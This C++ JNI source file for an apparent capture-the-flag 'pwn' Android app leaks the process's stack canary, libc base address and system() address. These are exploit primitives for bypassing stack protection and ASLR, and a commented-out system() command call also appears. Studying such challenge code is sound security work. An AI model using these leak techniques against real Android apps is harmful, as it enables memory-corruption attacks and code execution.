// -----------------------------------------------------------------------------
// Native library for CryptoNotes Pwn App.
// -----------------------------------------------------------------------------
#include <jni.h>
#include <string>
#include <dlfcn.h>
#include <link.h>
#include <android/log.h>


// -----------------------------------------------------------------------------
// JNI_OnLoad: Get a copy of java VM object.
//
extern "C" JNIEXPORT jint JNICALL
JNI_OnLoad(JavaVM *vm, void *reserved) {
  __android_log_print(ANDROID_LOG_INFO,"ISPO", "Java VM: %p", vm);
  return 0x10006;
}

// -----------------------------------------------------------------------------
// Get canary value of the current App.
//
extern "C" JNIEXPORT jlong JNICALL
Java_com_tasteless_ispo_cryptonotespwn_MainActivity_getCanary(
    JNIEnv *env, jobject MainActivity /* this */) {
  char *var = NULL;  // dummy variable.
  unsigned long long int *canary;
  __android_log_print(ANDROID_LOG_INFO, "ISPO", "Dummy `var` at: 0x%p", &var);

  canary = (unsigned long long int*)(&var + 1);
  __android_log_print(ANDROID_LOG_INFO, "ISPO", "Canary: 0x%llX at 0x%p",
                      *canary, canary);

  return (jlong)(*canary);
}

// -----------------------------------------------------------------------------
// Callback for iterating over loaded modules.
int callback(struct dl_phdr_info *info, size_t size, void *data) {
  __android_log_print(ANDROID_LOG_INFO, "ISPO", "%p lib ~> %s",
                      info->dlpi_addr, info->dlpi_name);
  if (!strcmp(info->dlpi_name, "/apex/com.android.runtime/lib64/bionic/libc.so")) {
    __android_log_print(ANDROID_LOG_INFO, "ISPO", "libc found!");
    *(jlong*)data = (jlong)info->dlpi_addr;
    return 1;
  }

  return 0;
}

// -----------------------------------------------------------------------------
// Returns the address of libc.so
//
extern "C" JNIEXPORT jlong JNICALL
Java_com_tasteless_ispo_cryptonotespwn_MainActivity_getLibcBase(
    JNIEnv *env, jobject MainActivity /* this */) {
  jlong libc_base = 0;
  dl_iterate_phdr(callback, &libc_base);
  __android_log_print(ANDROID_LOG_INFO, "ISPO", "libc base at: %p", libc_base);

  return (jlong) libc_base;

  // Simpler approach: Get address of system() and subtract offset:
  // readelf --all libc.so | grep system@@LIBC
  //    1426: 000000000006ea90   718 FUNC    GLOBAL DEFAULT   14 system@@LIBC
}

// -----------------------------------------------------------------------------
// Returns the address of libc.system().
//
extern "C" JNIEXPORT jlong JNICALL
Java_com_tasteless_ispo_cryptonotespwn_MainActivity_getSystemAddr(
    JNIEnv *env, jobject MainActivity /* this */) {
  int (*system_ptr)(const char*) = &system;
  __android_log_print(ANDROID_LOG_INFO, "ISPO", "system() at: %p", system_ptr);

  // This command doesn't work, i.e., we can't write to filesystem.
  // system_ptr("touch /data/local/tmp/ispoleetmore");

  return (jlong)system_ptr;
}
